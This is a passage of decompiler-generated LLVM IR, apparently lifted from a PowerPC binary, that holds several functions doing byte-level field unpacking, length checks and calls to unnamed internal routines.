  store i32 %v2_1000c9ec, i32* @r29, align 4
  br i1 %v1_1000c9e8, label %dec_label_pc_1000ca2c, label %dec_label_pc_1000c9f8

dec_label_pc_1000c9f8:                            ; preds = %dec_label_pc_1000c9c4
  %v2_1000c9f0 = icmp sgt i32 %v2_1000c9ec, 3
  %v0_1000c9f8 = load i32, i32* @r30, align 4
  %v2_1000c9f8 = add i32 %v0_1000c9f8, %v2_1000c9e4
  store i32 %v2_1000c9f8, i32* %r9.global-to-local, align 4
  br i1 %v2_1000c9f0, label %dec_label_pc_1000ca08, label %dec_label_pc_1000ca00

dec_label_pc_1000ca00:                            ; preds = %dec_label_pc_1000c9f8
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000ca2c

dec_label_pc_1000ca08:                            ; preds = %dec_label_pc_1000c9f8
  %v0_1000ca08 = load i32, i32* @r31, align 4
  %v1_1000ca08 = add i32 %v0_1000ca08, 6
  %v2_1000ca08 = inttoptr i32 %v1_1000ca08 to i8*
  %v3_1000ca08 = load i8, i8* %v2_1000ca08, align 1
  %v5_1000ca0c = inttoptr i32 %v2_1000c9f8 to i8*
  store i8 %v3_1000ca08, i8* %v5_1000ca0c, align 1
  %v0_1000ca10 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000ca10 = add i32 %v0_1000ca10, 4
  store i32 %v1_1000ca10, i32* %r3.global-to-local, align 4
  %v0_1000ca14 = load i32, i32* @r31, align 4
  %v1_1000ca14 = add i32 %v0_1000ca14, 4
  %v2_1000ca14 = inttoptr i32 %v1_1000ca14 to i32*
  %v3_1000ca14 = load i32, i32* %v2_1000ca14, align 4
  %v1_1000ca18 = trunc i32 %v3_1000ca14 to i8
  %v2_1000ca18 = load i32, i32* %r9.global-to-local, align 4
  %v3_1000ca18 = add i32 %v2_1000ca18, 1
  %v4_1000ca18 = inttoptr i32 %v3_1000ca18 to i8*
  store i8 %v1_1000ca18, i8* %v4_1000ca18, align 1
  %v0_1000ca1c = load i32, i32* @r31, align 4
  %v1_1000ca1c = add i32 %v0_1000ca1c, 10
  %v2_1000ca1c = inttoptr i32 %v1_1000ca1c to i8*
  %v3_1000ca1c = load i8, i8* %v2_1000ca1c, align 1
  %v2_1000ca20 = load i32, i32* %r9.global-to-local, align 4
  %v3_1000ca20 = add i32 %v2_1000ca20, 2
  %v4_1000ca20 = inttoptr i32 %v3_1000ca20 to i8*
  store i8 %v3_1000ca1c, i8* %v4_1000ca20, align 1
  %v0_1000ca24 = load i32, i32* @r31, align 4
  %v1_1000ca24 = add i32 %v0_1000ca24, 8
  %v2_1000ca24 = inttoptr i32 %v1_1000ca24 to i32*
  %v3_1000ca24 = load i32, i32* %v2_1000ca24, align 4
  %v1_1000ca28 = trunc i32 %v3_1000ca24 to i8
  %v2_1000ca28 = load i32, i32* %r9.global-to-local, align 4
  %v3_1000ca28 = add i32 %v2_1000ca28, 3
  %v4_1000ca28 = inttoptr i32 %v3_1000ca28 to i8*
  store i8 %v1_1000ca28, i8* %v4_1000ca28, align 1
  %v0_1000ca3c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000ca2c

dec_label_pc_1000ca2c:                            ; preds = %dec_label_pc_1000c9c4, %dec_label_pc_1000ca00, %dec_label_pc_1000ca08
  %v0_1000ca3c = phi i32 [ %v2_1000c9e4, %dec_label_pc_1000c9c4 ], [ -1, %dec_label_pc_1000ca00 ], [ %v0_1000ca3c.pre, %dec_label_pc_1000ca08 ]
  ret i32 %v0_1000ca3c

; uselistorder directives
  uselistorder i32 %v2_1000c9e4, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 5, 6, 0 }
  uselistorder label %dec_label_pc_1000ca2c, { 2, 1, 0 }
}

define i32 @function_1000ca40(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000ca40:
  store i32 268487248, i32* @lr, align 4
  %v0_1000ca4c = call i32 @function_1000d2d4()
  %v1_1000ca50 = icmp slt i32 %v0_1000ca4c, 0
  br i1 %v1_1000ca50, label %dec_label_pc_1000ca5c, label %dec_label_pc_1000ca58

dec_label_pc_1000ca58:                            ; preds = %dec_label_pc_1000ca40
  %v1_1000ca58 = add i32 %v0_1000ca4c, 4
  br label %dec_label_pc_1000ca5c

dec_label_pc_1000ca5c:                            ; preds = %dec_label_pc_1000ca40, %dec_label_pc_1000ca58
  %v0_1000ca68 = phi i32 [ %v0_1000ca4c, %dec_label_pc_1000ca40 ], [ %v1_1000ca58, %dec_label_pc_1000ca58 ]
  ret i32 %v0_1000ca68

; uselistorder directives
  uselistorder label %dec_label_pc_1000ca5c, { 1, 0 }
}

define i32 @function_1000ca6c(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4) local_unnamed_addr {
dec_label_pc_1000ca6c:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* @r4, align 4
  %stack_var_-280 = alloca i32, align 4
  %v0_1000ca70 = load i32, i32* @lr, align 4
  store i32 %v0_1000ca70, i32* %r0.global-to-local, align 4
  %v2_1000ca78 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_1000ca78, i32* @r30, align 4
  store i32 %arg3, i32* @r29, align 4
  store i32 %tmp, i32* @r31, align 4
  store i32 256, i32* @r6, align 4
  store i32 %arg2, i32* @r28, align 4
  store i32 268487324, i32* @lr, align 4
  %v2_1000ca98 = call i32 @function_1000d1e0(i32 %v2_1000ca78, i32 256)
  store i32 %v2_1000ca98, i32* @r27, align 4
  %v1_1000ca9c = icmp slt i32 %v2_1000ca98, 0
  %v0_1000caa0 = load i32, i32* @r28, align 4
  %v2_1000caa0 = add i32 %v0_1000caa0, %v2_1000ca98
  store i32 %v2_1000caa0, i32* @r28, align 4
  %v1_1000caa4 = load i32, i32* @r29, align 4
  %v2_1000caa4 = sub i32 %v1_1000caa4, %v2_1000caa0
  %v1_1000caa8 = add i32 %v2_1000caa4, -10
  br i1 %v1_1000ca9c, label %dec_label_pc_1000cb64, label %dec_label_pc_1000cab4

dec_label_pc_1000cab4:                            ; preds = %dec_label_pc_1000ca6c
  %v0_1000cab8 = load i32, i32* @r26, align 4
  %v2_1000cab8 = add i32 %v0_1000cab8, %v2_1000caa0
  store i32 %v2_1000cab8, i32* @r30, align 4
  %tmp6 = icmp sgt i32 %v1_1000caa8, -1
  br i1 %tmp6, label %dec_label_pc_1000cac8, label %dec_label_pc_1000cac0

dec_label_pc_1000cac0:                            ; preds = %dec_label_pc_1000cab4
  store i32 %v1_1000caa8, i32* @r27, align 4
  br label %dec_label_pc_1000cb64

dec_label_pc_1000cac8:                            ; preds = %dec_label_pc_1000cab4
  store i32 268487372, i32* @lr, align 4
  %v1_1000cac8 = call i32 @function_10007760(i32 %v2_1000ca78)
  %v0_1000cacc = load i32, i32* @r30, align 4
  %v1_1000cacc = add i32 %v0_1000cacc, 2
  store i32 %v1_1000cacc, i32* %r8.global-to-local, align 4
  %v1_1000cad0 = load i32, i32* @r31, align 4
  %v2_1000cad0 = inttoptr i32 %v1_1000cad0 to i32*
  store i32 %v1_1000cac8, i32* %v2_1000cad0, align 4
  %v0_1000cad4 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000cad4 = add i32 %v0_1000cad4, 2
  store i32 %v1_1000cad4, i32* %r10.global-to-local, align 4
  %v0_1000cad8 = load i32, i32* @r30, align 4
  %v1_1000cad8 = add i32 %v0_1000cad8, 10
  store i32 %v1_1000cad8, i32* %r6.global-to-local, align 4
  %v0_1000cadc = load i32, i32* @r26, align 4
  %v1_1000cadc = load i32, i32* @r28, align 4
  %v2_1000cadc = add i32 %v1_1000cadc, %v0_1000cadc
  %v3_1000cadc = inttoptr i32 %v2_1000cadc to i8*
  %v4_1000cadc = load i8, i8* %v3_1000cadc, align 1
  %v5_1000cadc = zext i8 %v4_1000cadc to i32
  store i32 %v5_1000cadc, i32* %r0.global-to-local, align 4
  %v1_1000cae0 = add i32 %v0_1000cad8, 1
  %v2_1000cae0 = inttoptr i32 %v1_1000cae0 to i8*
  %v3_1000cae0 = load i8, i8* %v2_1000cae0, align 1
  %v4_1000cae0 = zext i8 %v3_1000cae0 to i32
  store i32 %v4_1000cae0, i32* %r9.global-to-local, align 4
  %v1_1000cae4 = mul nuw nsw i32 %v5_1000cadc, 256
  %v2_1000cae8 = or i32 %v4_1000cae0, %v1_1000cae4
  store i32 %v2_1000cae8, i32* %r0.global-to-local, align 4
  %v1_1000caec = load i32, i32* @r31, align 4
  %v2_1000caec = add i32 %v1_1000caec, 4
  %v3_1000caec = inttoptr i32 %v2_1000caec to i32*
  store i32 %v2_1000cae8, i32* %v3_1000caec, align 4
  %v0_1000caf0 = load i32, i32* @r30, align 4
  %v1_1000caf0 = add i32 %v0_1000caf0, 2
  %v2_1000caf0 = inttoptr i32 %v1_1000caf0 to i8*
  %v3_1000caf0 = load i8, i8* %v2_1000caf0, align 1
  %v4_1000caf0 = zext i8 %v3_1000caf0 to i32
  store i32 %v4_1000caf0, i32* %r0.global-to-local, align 4
  %v0_1000caf4 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000caf4 = add i32 %v0_1000caf4, 1
  %v2_1000caf4 = inttoptr i32 %v1_1000caf4 to i8*
  %v3_1000caf4 = load i8, i8* %v2_1000caf4, align 1
  %v4_1000caf4 = zext i8 %v3_1000caf4 to i32
  store i32 %v4_1000caf4, i32* %r9.global-to-local, align 4
  %v1_1000caf8 = mul nuw nsw i32 %v4_1000caf0, 256
  %v2_1000cafc = or i32 %v4_1000caf4, %v1_1000caf8
  store i32 %v2_1000cafc, i32* %r0.global-to-local, align 4
  %v1_1000cb00 = load i32, i32* @r31, align 4
  %v2_1000cb00 = add i32 %v1_1000cb00, 8
  %v3_1000cb00 = inttoptr i32 %v2_1000cb00 to i32*
  store i32 %v2_1000cafc, i32* %v3_1000cb00, align 4
  %v0_1000cb04 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000cb04 = add i32 %v0_1000cb04, 2
  %v2_1000cb04 = inttoptr i32 %v1_1000cb04 to i8*
  %v3_1000cb04 = load i8, i8* %v2_1000cb04, align 1
  %v4_1000cb04 = zext i8 %v3_1000cb04 to i32
  store i32 %v4_1000cb04, i32* %r0.global-to-local, align 4
  %v0_1000cb08 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000cb08 = add i32 %v0_1000cb08, 1
  %v2_1000cb08 = inttoptr i32 %v1_1000cb08 to i8*
  %v3_1000cb08 = load i8, i8* %v2_1000cb08, align 1
  %v4_1000cb08 = zext i8 %v3_1000cb08 to i32
  store i32 %v4_1000cb08, i32* %r11.global-to-local, align 4
  %v1_1000cb0c = add i32 %v0_1000cb08, 3
  %v2_1000cb0c = inttoptr i32 %v1_1000cb0c to i8*
  %v3_1000cb0c = load i8, i8* %v2_1000cb0c, align 1
  %v4_1000cb0c = zext i8 %v3_1000cb0c to i32
  %v1_1000cb10 = mul nuw i32 %v4_1000cb04, 16777216
  store i32 %v1_1000cb10, i32* %r0.global-to-local, align 4
  %v1_1000cb14 = add i32 %v0_1000cb08, 2
  %v2_1000cb14 = inttoptr i32 %v1_1000cb14 to i8*
  %v3_1000cb14 = load i8, i8* %v2_1000cb14, align 1
  %v4_1000cb14 = zext i8 %v3_1000cb14 to i32
  %v1_1000cb18 = mul nuw nsw i32 %v4_1000cb08, 65536
  %v2_1000cb1c = or i32 %v1_1000cb18, %v1_1000cb10
  %v0_1000cb20 = load i32, i32* @r28, align 4
  %v1_1000cb20 = add i32 %v0_1000cb20, 10
  store i32 %v1_1000cb20, i32* %r11.global-to-local, align 4
  %v2_1000cb24 = or i32 %v2_1000cb1c, %v4_1000cb0c
  store i32 %v2_1000cb24, i32* %r0.global-to-local, align 4
  %v1_1000cb28 = mul nuw nsw i32 %v4_1000cb14, 256
  %v2_1000cb2c = or i32 %v1_1000cb28, %v2_1000cb24
  store i32 %v2_1000cb2c, i32* %r9.global-to-local, align 4
  %v1_1000cb30 = load i32, i32* @r31, align 4
  %v2_1000cb30 = add i32 %v1_1000cb30, 12
  %v3_1000cb30 = inttoptr i32 %v2_1000cb30 to i32*
  store i32 %v2_1000cb2c, i32* %v3_1000cb30, align 4
  %v0_1000cb34 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000cb34 = add i32 %v0_1000cb34, 6
  %v2_1000cb34 = inttoptr i32 %v1_1000cb34 to i8*
  %v3_1000cb34 = load i8, i8* %v2_1000cb34, align 1
  %v4_1000cb34 = zext i8 %v3_1000cb34 to i32
  store i32 %v4_1000cb34, i32* %r9.global-to-local, align 4
  %v0_1000cb38 = load i32, i32* @r30, align 4
  %v1_1000cb38 = add i32 %v0_1000cb38, 9
  %v2_1000cb38 = inttoptr i32 %v1_1000cb38 to i8*
  %v3_1000cb38 = load i8, i8* %v2_1000cb38, align 1
  %v4_1000cb38 = zext i8 %v3_1000cb38 to i32
  store i32 %v4_1000cb38, i32* %r0.global-to-local, align 4
  %v1_1000cb3c = mul nuw nsw i32 %v4_1000cb34, 256
  store i32 %v1_1000cb3c, i32* %r9.global-to-local, align 4
  %v0_1000cb40 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000cb40 = load i32, i32* @r31, align 4
  %v2_1000cb40 = add i32 %v1_1000cb40, 24
  %v3_1000cb40 = inttoptr i32 %v2_1000cb40 to i32*
  store i32 %v0_1000cb40, i32* %v3_1000cb40, align 4
  %v0_1000cb44 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000cb44 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000cb44 = or i32 %v1_1000cb44, %v0_1000cb44
  store i32 %v2_1000cb44, i32* %r9.global-to-local, align 4
  %v0_1000cb48 = load i32, i32* %r6.global-to-local, align 4
  %v1_1000cb48 = load i32, i32* @r31, align 4
  %v2_1000cb48 = add i32 %v1_1000cb48, 20
  %v3_1000cb48 = inttoptr i32 %v2_1000cb48 to i32*
  store i32 %v0_1000cb48, i32* %v3_1000cb48, align 4
  %v0_1000cb4c = load i32, i32* @r29, align 4
  %v1_1000cb4c = load i32, i32* %r9.global-to-local, align 4
  %v2_1000cb4c = icmp slt i32 %v0_1000cb4c, %v1_1000cb4c
  %v1_1000cb50 = add i32 %v1_1000cb4c, 10
  store i32 %v1_1000cb50, i32* %r0.global-to-local, align 4
  %v0_1000cb54 = load i32, i32* @r27, align 4
  %v2_1000cb54 = add i32 %v0_1000cb54, %v1_1000cb50
  store i32 %v2_1000cb54, i32* @r27, align 4
  %v1_1000cb58 = load i32, i32* @r31, align 4
  %v2_1000cb58 = add i32 %v1_1000cb58, 16
  %v3_1000cb58 = inttoptr i32 %v2_1000cb58 to i32*
  store i32 %v1_1000cb4c, i32* %v3_1000cb58, align 4
  br i1 %v2_1000cb4c, label %dec_label_pc_1000cb60, label %dec_label_pc_1000cac8.dec_label_pc_1000cb64_crit_edge

dec_label_pc_1000cac8.dec_label_pc_1000cb64_crit_edge: ; preds = %dec_label_pc_1000cac8
  %v0_1000cb68.pre = load i32, i32* @r27, align 4
  br label %dec_label_pc_1000cb64

dec_label_pc_1000cb60:                            ; preds = %dec_label_pc_1000cac8
  store i32 -1, i32* @r27, align 4
  br label %dec_label_pc_1000cb64

dec_label_pc_1000cb64:                            ; preds = %dec_label_pc_1000cac8.dec_label_pc_1000cb64_crit_edge, %dec_label_pc_1000ca6c, %dec_label_pc_1000cac0, %dec_label_pc_1000cb60
  %v0_1000cb68 = phi i32 [ %v0_1000cb68.pre, %dec_label_pc_1000cac8.dec_label_pc_1000cb64_crit_edge ], [ %v2_1000ca98, %dec_label_pc_1000ca6c ], [ %v1_1000caa8, %dec_label_pc_1000cac0 ], [ -1, %dec_label_pc_1000cb60 ]
  store i32 %v0_1000ca70, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000cb68

; uselistorder directives
  uselistorder i32 %v1_1000cb4c, { 1, 0, 2 }
  uselistorder i32 %v1_1000cb10, { 1, 0 }
  uselistorder i32 %v1_1000caa8, { 1, 2, 0 }
  uselistorder i32 %v2_1000ca98, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1000ca78, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 0 }
  uselistorder i32 20, { 16, 17, 18, 19, 1, 23, 20, 21, 24, 25, 26, 27, 10, 11, 13, 12, 0, 37, 38, 28, 29, 30, 31, 32, 34, 35, 33, 36, 22, 4, 14, 5, 3, 2, 6, 15, 7, 8, 9 }
  uselistorder i32 9, { 10, 11, 12, 13, 2, 0, 14, 3, 15, 4, 16, 17, 18, 19, 20, 21, 1, 5, 6, 7, 8, 9 }
  uselistorder i32 (i32)* @function_10007760, { 2, 1, 0, 3 }
  uselistorder i32 -10, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1000cb64, { 3, 0, 2, 1 }
}

define i32 @function_1000cb7c() local_unnamed_addr {
dec_label_pc_1000cb7c:
  %v0_1000cb80 = load i32, i32* @lr, align 4
  store i32 268487588, i32* @lr, align 4
  %v3_1000cba0 = call i32 @function_10004f90(i32 ptrtoint ([11 x i8]* @global_var_1000f918.350 to i32), i32 ptrtoint (i32* @global_var_1000f8b4.320 to i32))
  %v3_1000cba8 = icmp eq i32 %v3_1000cba0, 0
  br i1 %v3_1000cba8, label %dec_label_pc_1000cbb0, label %dec_label_pc_1000cbcc

dec_label_pc_1000cbb0:                            ; preds = %dec_label_pc_1000cb7c
  %v0_1000cba4 = load i32, i32* @r29, align 4
  store i32 %v0_1000cb80, i32* @lr, align 4
  %v3_1000cbc8 = call i32 @function_10004f90(i32 ptrtoint ([18 x i8]* @global_var_1000f924.351 to i32), i32 %v0_1000cba4)
  br label %dec_label_pc_1000cbcc

dec_label_pc_1000cbcc:                            ; preds = %dec_label_pc_1000cb7c, %dec_label_pc_1000cbb0
  %v0_1000cbdc = phi i32 [ %v3_1000cba0, %dec_label_pc_1000cb7c ], [ %v3_1000cbc8, %dec_label_pc_1000cbb0 ]
  ret i32 %v0_1000cbdc

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_10004f90, { 8, 4, 3, 2, 7, 6, 5, 1, 0 }
  uselistorder label %dec_label_pc_1000cbcc, { 1, 0 }
}

define i32 @function_1000cbe0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
dec_label_pc_1000cbe0:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r19.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg7, i32* %r9.global-to-local, align 4
  %tmp = ptrtoint i32* %arg5 to i32
  %v0_1000cbe0 = load i32, i32* @lr, align 4
  store i32 %arg6, i32* @r30, align 4
  %v1_1000cbf4 = sub i32 0, %arg6
  %v1_1000cbf8 = urem i32 %v1_1000cbf4, 4
  store i32 %v1_1000cbf8, i32* %r0.global-to-local, align 4
  %v3_1000cbf8 = icmp eq i32 %v1_1000cbf8, 0
  store i32 %arg1, i32* @r20, align 4
  store i32 %arg2, i32* %r15.global-to-local, align 4
  store i32 %arg3, i32* %r19.global-to-local, align 4
  store i32 %arg4, i32* %r18.global-to-local, align 4
  store i32 %tmp, i32* @r28, align 4
  %v0_1000cc10 = load i32, i32* @r10, align 4
  store i32 %v0_1000cc10, i32* %r17.global-to-local, align 4
  store i32 %arg8, i32* %r16.global-to-local, align 4
  %v0_1000cc2c.pr = load i32, i32* %r9.global-to-local, align 4
  br i1 %v3_1000cbf8, label %dec_label_pc_1000cc2c, label %dec_label_pc_1000cc1c

dec_label_pc_1000cc1c:                            ; preds = %dec_label_pc_1000cbe0
  %v2_1000cc1c = icmp ult i32 %v0_1000cc2c.pr, %v1_1000cbf8
  br i1 %v2_1000cc1c, label %dec_label_pc_1000cee0, label %dec_label_pc_1000cc24

dec_label_pc_1000cc24:                            ; preds = %dec_label_pc_1000cc1c
  %v2_1000cc24 = sub i32 %v0_1000cc2c.pr, %v1_1000cbf8
  store i32 %v2_1000cc24, i32* %r9.global-to-local, align 4
  %v2_1000cc28 = add i32 %v1_1000cbf8, %arg6
  store i32 %v2_1000cc28, i32* @r30, align 4
  br label %dec_label_pc_1000cc2c

dec_label_pc_1000cc2c:                            ; preds = %dec_label_pc_1000cbe0, %dec_label_pc_1000cc24
  %v0_1000cc38 = phi i32 [ %v2_1000cc28, %dec_label_pc_1000cc24 ], [ %arg6, %dec_label_pc_1000cbe0 ]
  %v0_1000cc3c = phi i32 [ %v2_1000cc24, %dec_label_pc_1000cc24 ], [ %v0_1000cc2c.pr, %dec_label_pc_1000cbe0 ]
  %tmp49 = icmp ult i32 %v0_1000cc3c, 32
  br i1 %tmp49, label %dec_label_pc_1000cee0, label %dec_label_pc_1000cc34

dec_label_pc_1000cc34:                            ; preds = %dec_label_pc_1000cc2c
  %v3_1000cc34 = icmp eq i32 %arg4, 1
  %v1_1000cc38 = add i32 %v0_1000cc38, 32
  store i32 %v1_1000cc38, i32* @r24, align 4
  %v1_1000cc3c = add i32 %v0_1000cc3c, -32
  store i32 %v1_1000cc3c, i32* @r27, align 4
  br i1 %v3_1000cc34, label %dec_label_pc_1000cd3c, label %dec_label_pc_1000cc44

dec_label_pc_1000cc44:                            ; preds = %dec_label_pc_1000cc34
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1000cc4c = inttoptr i32 %arg8 to i32*
  store i32 -1, i32* %v2_1000cc4c, align 4
  %tmp50 = icmp ult i32 %v1_1000cc3c, 4
  br i1 %tmp50, label %dec_label_pc_1000cee0, label %dec_label_pc_1000cc54

dec_label_pc_1000cc54:                            ; preds = %dec_label_pc_1000cc44
  %v0_1000cc54 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000cc54 = add i32 %v0_1000cc54, -36
  store i32 %v1_1000cc54, i32* %r0.global-to-local, align 4
  %tmp51 = icmp ult i32 %v1_1000cc54, 8
  br i1 %tmp51, label %dec_label_pc_1000cee0, label %dec_label_pc_1000cc60

dec_label_pc_1000cc60:                            ; preds = %dec_label_pc_1000cc54
  %v0_1000cc60 = load i32, i32* @r27, align 4
  %tmp52 = icmp ult i32 %v0_1000cc60, 16
  br i1 %tmp52, label %dec_label_pc_1000cee0, label %dec_label_pc_1000cc68

dec_label_pc_1000cc68:                            ; preds = %dec_label_pc_1000cc60
  %v1_1000cc68 = add i32 %v0_1000cc54, -48
  store i32 %v1_1000cc68, i32* %r0.global-to-local, align 4
  %tmp53 = icmp ult i32 %v1_1000cc68, 8
  br i1 %tmp53, label %dec_label_pc_1000cee0, label %dec_label_pc_1000cc74

dec_label_pc_1000cc74:                            ; preds = %dec_label_pc_1000cc68
  %v1_1000cc74 = add i32 %v0_1000cc54, -56
  store i32 %v1_1000cc74, i32* %r0.global-to-local, align 4
  %v1_1000cc78 = add i32 %v0_1000cc54, -44
  store i32 %v1_1000cc78, i32* @r27, align 4
  %v3_1000cc7c = icmp ugt i32 %v1_1000cc74, %v1_1000cc78
  %v0_1000cc80 = load i32, i32* @r30, align 4
  %v1_1000cc80 = add i32 %v0_1000cc80, 36
  store i32 %v1_1000cc80, i32* @r29, align 4
  %v1_1000cc84 = add i32 %v0_1000cc80, 48
  store i32 %v1_1000cc84, i32* @r26, align 4
  br i1 %v3_1000cc7c, label %dec_label_pc_1000cc98, label %dec_label_pc_1000cc90

dec_label_pc_1000cc90:                            ; preds = %dec_label_pc_1000cc74
  store i32 %v1_1000cc74, i32* @r27, align 4
  br label %dec_label_pc_1000cc98

dec_label_pc_1000cc98:                            ; preds = %dec_label_pc_1000cc74, %dec_label_pc_1000cc90
  %v0_1000cc98 = phi i32 [ %v1_1000cc74, %dec_label_pc_1000cc90 ], [ %v1_1000cc78, %dec_label_pc_1000cc74 ]
  %tmp54 = icmp ult i32 %v0_1000cc98, 80
  br i1 %tmp54, label %dec_label_pc_1000cee0, label %dec_label_pc_1000cca0

dec_label_pc_1000cca0:                            ; preds = %dec_label_pc_1000cc98
  store i32 268487844, i32* @lr, align 4
  %v0_1000cca0 = call i32 @function_1000cb7c()
  store i32 %v0_1000cca0, i32* @r20, align 4
  %v3_1000cca4 = icmp eq i32 %v0_1000cca0, 0
  br i1 %v3_1000cca4, label %dec_label_pc_1000ccc4, label %dec_label_pc_1000ccac

dec_label_pc_1000ccac:                            ; preds = %dec_label_pc_1000cca0
  %v0_1000ccac = load i32, i32* @r24, align 4
  store i32 %v0_1000ccac, i32* @r25, align 4
  %v0_1000ccb4 = load i32, i32* @r26, align 4
  store i32 %v0_1000ccb4, i32* @r23, align 4
  %v0_1000ccb8 = load i32, i32* @r31, align 4
  store i32 %v0_1000ccb8, i32* @r24, align 4
  store i32 %v0_1000ccac, i32* %r21.global-to-local, align 4
  %v1_1000cd54.pre = load i32, i32* %r16.global-to-local, align 4
  br label %dec_label_pc_1000cd4c

dec_label_pc_1000ccc4:                            ; preds = %dec_label_pc_1000cca0
  %v1_1000ccc4 = load i32, i32* %r17.global-to-local, align 4
  %v2_1000ccc4 = inttoptr i32 %v1_1000ccc4 to i32*
  store i32 0, i32* %v2_1000ccc4, align 4
  %v0_1000ccc8 = call i32 @function_10004e38()
  %v1_1000cccc = inttoptr i32 %v0_1000ccc8 to i32*
  %v2_1000cccc = load i32, i32* %v1_1000cccc, align 4
  store i32 %v2_1000cccc, i32* @r26, align 4
  br label %dec_label_pc_1000cee4

dec_label_pc_1000ccd4:                            ; preds = %dec_label_pc_1000ce74
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1000ccd8 = load i32, i32* @r25, align 4
  %v1_1000ccd8 = load i32, i32* @r22, align 4
  %v2_1000ccd8 = inttoptr i32 %v1_1000ccd8 to i32*
  store i32 %v0_1000ccd8, i32* %v2_1000ccd8, align 4
  %v0_1000ccdc = load i32, i32* %r0.global-to-local, align 4
  %v1_1000ccdc = load i32, i32* @r22, align 4
  %v2_1000ccdc = add i32 %v1_1000ccdc, 4
  %v3_1000ccdc = inttoptr i32 %v2_1000ccdc to i32*
  store i32 %v0_1000ccdc, i32* %v3_1000ccdc, align 4
  %v0_1000cce0 = load i32, i32* @r30, align 4
  %v1_1000cce0 = add i32 %v0_1000cce0, 8
  store i32 %v1_1000cce0, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  %v1_1000cce8 = add i32 %v0_1000cce0, 4
  %v2_1000cce8 = inttoptr i32 %v1_1000cce8 to i32*
  %v3_1000cce8 = load i32, i32* %v2_1000cce8, align 4
  store i32 %v3_1000cce8, i32* %r0.global-to-local, align 4
  %v0_1000ccec = load i32, i32* %r19.global-to-local, align 4
  %v1_1000ccec = load i32, i32* @r28, align 4
  %v2_1000ccec = add i32 %v1_1000ccec, 8
  %v3_1000ccec = inttoptr i32 %v2_1000ccec to i32*
  store i32 %v0_1000ccec, i32* %v3_1000ccec, align 4
  %v0_1000ccf0 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000ccf0 = load i32, i32* @r28, align 4
  %v2_1000ccf0 = inttoptr i32 %v1_1000ccf0 to i32*
  store i32 %v0_1000ccf0, i32* %v2_1000ccf0, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_1000ccf8 = load i32, i32* @r28, align 4
  %v2_1000ccf8 = add i32 %v1_1000ccf8, 12
  %v3_1000ccf8 = inttoptr i32 %v2_1000ccf8 to i32*
  store i32 4, i32* %v3_1000ccf8, align 4
  %v0_1000ccfc = load i32, i32* @r22, align 4
  %v1_1000ccfc = load i32, i32* @r28, align 4
  %v2_1000ccfc = add i32 %v1_1000ccfc, 16
  %v3_1000ccfc = inttoptr i32 %v2_1000ccfc to i32*
  store i32 %v0_1000ccfc, i32* %v3_1000ccfc, align 4
  br label %dec_label_pc_1000cd30

dec_label_pc_1000cd04:                            ; preds = %dec_label_pc_1000ce98
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1000cd08 = load i32, i32* %r21.global-to-local, align 4
  %v1_1000cd08 = load i32, i32* @r23, align 4
  %v2_1000cd08 = inttoptr i32 %v1_1000cd08 to i32*
  store i32 %v0_1000cd08, i32* %v2_1000cd08, align 4
  %v0_1000cd0c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000cd0c = load i32, i32* @r23, align 4
  %v2_1000cd0c = add i32 %v1_1000cd0c, 4
  %v3_1000cd0c = inttoptr i32 %v2_1000cd0c to i32*
  store i32 %v0_1000cd0c, i32* %v3_1000cd0c, align 4
  %v0_1000cd10 = load i32, i32* @r30, align 4
  %v1_1000cd10 = add i32 %v0_1000cd10, 8
  store i32 %v1_1000cd10, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  %v1_1000cd18 = add i32 %v0_1000cd10, 4
  %v2_1000cd18 = inttoptr i32 %v1_1000cd18 to i32*
  %v3_1000cd18 = load i32, i32* %v2_1000cd18, align 4
  store i32 %v3_1000cd18, i32* %r0.global-to-local, align 4
  %v0_1000cd1c = load i32, i32* %r19.global-to-local, align 4
  %v1_1000cd1c = load i32, i32* @r28, align 4
  %v2_1000cd1c = add i32 %v1_1000cd1c, 8
  %v3_1000cd1c = inttoptr i32 %v2_1000cd1c to i32*
  store i32 %v0_1000cd1c, i32* %v3_1000cd1c, align 4
